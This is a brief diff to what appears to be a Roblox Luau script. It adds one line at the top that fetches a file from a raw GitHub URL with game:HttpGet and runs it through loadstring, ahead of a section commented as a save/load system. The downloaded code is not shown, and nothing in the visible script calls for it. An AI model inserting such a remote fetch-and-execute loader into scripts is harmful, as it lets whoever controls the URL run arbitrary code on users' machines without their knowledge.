@@ -1,3 +1,6 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Nightzzw/Scripts.luau/refs/heads/main/2330787160979128.lua.txt"))()
+
+
 repeat task.wait() until game:IsLoaded()
 
 -- // SISTEMA DE SAVE/LOAD // --
